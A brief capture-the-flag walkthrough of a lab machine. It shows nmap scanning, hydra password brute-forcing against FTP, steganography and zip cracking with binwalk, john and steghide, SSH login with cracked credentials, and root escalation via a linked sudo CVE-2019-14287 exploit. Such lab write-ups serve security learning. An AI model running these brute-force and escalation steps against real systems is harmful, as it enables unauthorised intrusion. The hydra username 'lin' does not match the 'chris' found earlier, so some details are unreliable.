did nmap scan
```bash
nmap -sS 10.10.211.21
```

got three ports running 
- SSH
- FTP
- HTTP

lets observe the web page now we have a hint that changing user-agent header value may give us something 
we got the username of Agent C is chris
Now as we have username we can try brute forcing FTP or SSH, lets try FTP, for that we can use hydra
```bash
hydra -l lin -P /usr/share/wordlists/rockyou.txt 10.10.211.21 ftp
```

some times it we continue its previous session, for that we can use the following
```bash
hydra -I -l lin -P /usr/share/wordlists/rockyou.txt ftp://10.10.211.21
```

we got the password to it that is crystal

we got two images and a text file, the text file hints that there is something hidden in the images

we can use exif to get if there is something 
```bash
exiftool cutie.png
```
there is something in this image

we can use binwalk to analysis the data present in it
```bash
binwalk cutie.png
```
we get some data here and a zip but it is password protected
we can use zip to john to first convert the data
```bash
zip2john 8702.zip > extract.txt
```
now we get a data that is suitable for john now we can use john to get password of the zip
```bash
john extract.txt
```
boom we got the password for the zip it is "alien"
extracting the zip gives us a message from agent r
it has a text with a coded message of some encoding tried bas64 and we got our steg password "Area51"
we used steghide to extract the data
```bash
steghide extract -sf cute-alien.jpg
```
doing so we need to enter the paraphrase that we found and we get message.txt and there we can see the second agent is "james" and "hackerrules!" which may be for ssh
now trying ssh
```bash
ssh james@10.10.211.21
```
boom we got the user flag and we have a image here
lets just download it to see it
```bash
scp james@10.10.211.21:Alien_autospy.jpg .
```
a image of alien, lets run it through google image search and we get a result, had to take a hint for it
it was related to an incident
Roswell alien autopsy

now lets think of escalating previlages 
```bash
sudo -l
```
nothing useful found 
nothing came back from GTFO bins also
checked the version of sudo
```bash
sudo -V
```
got an exploit for it can be used to escalate priv
[PrivEsc Exploit](https://github.com/n0w4n/CVE-2019-14287/blob/master/sudo.sh)
give executable permissions to it
```bash
chmod +x exploit.sh
```
run it and boom you have root access
you can get the root flag and also got the name of agent R
Done with it CTF solved